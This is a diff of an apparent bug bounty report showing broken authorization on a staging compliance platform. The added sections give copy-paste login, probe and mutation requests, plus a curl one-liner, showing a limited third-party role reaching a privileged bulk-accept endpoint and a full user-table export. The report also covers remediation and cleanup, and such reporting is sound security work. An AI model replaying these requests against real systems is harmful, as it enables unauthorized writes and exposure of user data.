@@ -89,37 +89,169 @@ Both queue a **full user-table export** (354 users, 317 emails) for a limited th
 
 ---
 
-## 5. Reproduction — copy-paste
+## 5. Where this lives in the app (UI location)
+
+The feature is the **AI Suggested Controls** panel on a Narrative.
+
+| item | value |
+| --- | --- |
+| **Page URL** | `https://bugbounty1.qe.optrostaging.ai/sh/narratives/38` |
+| **Navigation path** | Left nav → **Narratives** → open narrative **`ZX-TESTER-1a33b (Legal_NR)`** (id 38) |
+| **Panel entry point** | Right-hand toolkit → button **`AI Suggested Controls`** |
+| **Panel content** | A list of suggested controls, each with **`Accept`** / **`Reject`** buttons |
+| **Network call fired by `Accept`** | `POST /api/v1/suggestions/bulk-accept-with-control-implementation` |
+
+The panel on narrative 38 lists 24 suggestions (ids 41–64). Suggestion **41** proposes `ControlsDatum#597`:
+
+```
+Control   High
+ELC.FA.1.KR03 Accountant sends a list of all construction in process projects
+that have actual spend to the appropriate managers.
+Narrative reference: This is then reviewed monthly by the Accounting ...
+[Reject] [Accept]
+```
+
+Pressing **Accept** sends the request below. The vulnerability is that this request is **not authorized** — the server never checks the caller's role.
+
+---
+
+## 6. HTTP requests — copy-paste
+
+### 6.1 Get a session token
 
 ```bash
 H="https://bugbounty1.qe.optrostaging.ai"
 BB="X-Optro-Bug-Bounty: zeno0"
 
-# Limited Third Party User (role 11)
-T=$(curl -s -X POST "$H/api/v1/users/login" -H "$BB" \
-  -H "Content-Type: application/json" \
-  -d '{"credentials":{"email":"<tpu-account>","password":"<pw>"}}' \
-  | python3 -c 'import sys,json;print(json.load(sys.stdin)["session"]["token"])')
+# Limited Third Party User (role 11) — the attacker
+curl -s -X POST "$H/api/v1/users/login" \
+  -H "$BB" -H "Content-Type: application/json" \
+  -d '{"credentials":{"email":"<tpu-account>","password":"<pw>"}}'
+```
 
-# Control: this role cannot read the suggestion
-curl -s "$H/api/v1/suggestions/41" -H "token: $T" -H "$BB"
-# → 422 ModelActionPermissionDenied
+Response contains `session.token` (format `<user_id>:<40-hex>`):
 
-# Control: this role cannot read the parent narrative
-curl -s "$H/api/v1/narratives/38" -H "token: $T" -H "$BB"
-# → 422 ModelActionPermissionDenied
+```bash
+T="315:<tpu-token>"
+```
 
-# Finding: but it reaches the bulk mutation handler
+### 6.2 Control A — the role cannot read the suggestion
+
+```http
+GET /api/v1/suggestions/41 HTTP/2
+Host: bugbounty1.qe.optrostaging.ai
+token: 315:<tpu-token>
+X-Optro-Bug-Bounty: zeno0
+```
+
+```json
+HTTP/2 422
+{"errors":[{"code":"ModelActionPermissionDenied",
+ "detail":"You do not have permission to perform this action. (Permission: suggestion:action.view)"}]}
+```
+
+### 6.3 Control B — the role cannot read the parent narrative
+
+```http
+GET /api/v1/narratives/38 HTTP/2
+Host: bugbounty1.qe.optrostaging.ai
+token: 315:<tpu-token>
+X-Optro-Bug-Bounty: zeno0
+```
+
+```json
+HTTP/2 422
+{"errors":[{"code":"ModelActionPermissionDenied",
+ "detail":"You do not have permission to perform this action. (Permission: narrative:action.view)"}]}
+```
+
+### 6.4 Control C — the role sees zero suggestions
+
+```http
+GET /api/v1/suggestions HTTP/2
+Host: bugbounty1.qe.optrostaging.ai
+token: 315:<tpu-token>
+X-Optro-Bug-Bounty: zeno0
+```
+
+```json
+HTTP/2 200
+{"suggestions":[],"meta":{"resourceNames":{"dasherized":"suggestion","camelized":"suggestion"}}}
+```
+
+Owner sees **111** suggestions on the same request.
+
+### 6.5 THE FINDING — the privileged mutation is reachable
+
+```http
+POST /api/v1/suggestions/bulk-accept-with-control-implementation HTTP/2
+Host: bugbounty1.qe.optrostaging.ai
+token: 315:<tpu-token>
+X-Optro-Bug-Bounty: zeno0
+X-Auditboard-Product: System
+Content-Type: application/json
+
+{"data":{"suggestionIds":[41],"createControlImpls":false,"programIds":[]}}
+```
+
+```json
+HTTP/2 422
+{"status":"failed",
+ "summary":{"created":{"controls":{"count":0,"ids":[],"uids":[]},
+                      "controlImplementations":{"count":0,"ids":[],"uids":[]}},
+            "failed":{"processes":{"count":1,"errors":[{"uid":"41",
+              "error":"Error processing suggestion 41: suggestable[(intermediate value)(intermediate value)(intermediate value)] is not a function"}]},
+            "existingUids":{"count":0,"ids":[],"uids":[]},
+            "controlImplementations":[]}}
+```
+
+**This response is byte-identical to the Owner's response for the same request.** It is a *processing* summary — it contains no `permission`, `forbidden`, `denied`, `not authorized` or `ModelActionPermissionDenied` token. The limited role reached the business logic.
+
+### 6.6 Second unguarded action — full user-table export
+
+```http
+POST /api/v1/users/export HTTP/2
+Host: bugbounty1.qe.optrostaging.ai
+token: 315:<tpu-token>
+X-Optro-Bug-Bounty: zeno0
+X-AuditBoard-Source: SchemaTable Rows
+Content-Type: application/json
+
+{"exportColumns":[{"path":"id","label":"ID"},{"path":"email","label":"Email"}],
+ "query":{},"format":"csv","timezone":"UTC","fileName":"zx"}
+```
+
+```json
+HTTP/2 200
+{"status":"ok"}
+```
+
+Same result on `POST /api/v1/users/_op/async_export`. A limited third-party user can queue an export of the full user table (354 users, 317 emails).
+
+### 6.7 One-liner to reproduce all of it
+
+```bash
+H="https://bugbounty1.qe.optrostaging.ai"; BB="X-Optro-Bug-Bounty: zeno0"
+T="315:<tpu-token>"
+
+echo "--- control: cannot read suggestion ---"
+curl -s -o /dev/null -w "%{http_code}\n" "$H/api/v1/suggestions/41" -H "token: $T" -H "$BB"
+
+echo "--- control: cannot read narrative ---"
+curl -s -o /dev/null -w "%{http_code}\n" "$H/api/v1/narratives/38" -H "token: $T" -H "$BB"
+
+echo "--- finding: reaches the mutation handler ---"
 curl -s -X POST "$H/api/v1/suggestions/bulk-accept-with-control-implementation" \
   -H "token: $T" -H "$BB" -H "Content-Type: application/json" \
   -H "X-Auditboard-Product: System" \
   -d '{"data":{"suggestionIds":[41],"createControlImpls":false,"programIds":[]}}'
-# → 422 with a PROCESSING summary (no permission keyword), identical to Owner
 ```
+
+Expected: `422`, `422`, then a `{"status":"failed","summary":{...}}` processing body with no permission keyword.
 
 ---
 
-## 6. What was tested and did NOT work (honest negatives)
+## 7. What was tested and did NOT work (honest negatives)
 
 | vector | result |
 | --- | --- |
@@ -139,7 +271,7 @@ curl -s -X POST "$H/api/v1/suggestions/bulk-accept-with-control-implementation" 
 
 ---
 
-## 7. Impact
+## 8. Impact
 
 - **A limited Third Party User reaches a privileged bulk-mutation handler** that creates controls and control implementations across programs and entities — the same handler an Owner uses.
 - **No authorization check exists on the route.** The response is byte-identical between role 11 and role 5, which means the only thing preventing a write is the handler's own bug.
@@ -150,7 +282,7 @@ curl -s -X POST "$H/api/v1/suggestions/bulk-accept-with-control-implementation" 
 
 ---
 
-## 8. Remediation
+## 9. Remediation
 
 1. Add an explicit permission check to `suggestions/bulk-accept-with-control-implementation` — the same `suggestion:action.*` check that already protects `GET /suggestions/{id}`.
 2. Apply the same check to `users/export` and `users/_op/async_export`.
@@ -159,7 +291,7 @@ curl -s -X POST "$H/api/v1/suggestions/bulk-accept-with-control-implementation" 
 
 ---
 
-## 9. Evidence / cleanup
+## 10. Evidence / cleanup
 
 - Read-only probing plus one bulk-accept attempt per role. **No state change occurred** (all responses report `created.count: 0`).
 - Export calls queued but produced no artifact; nothing was downloaded.
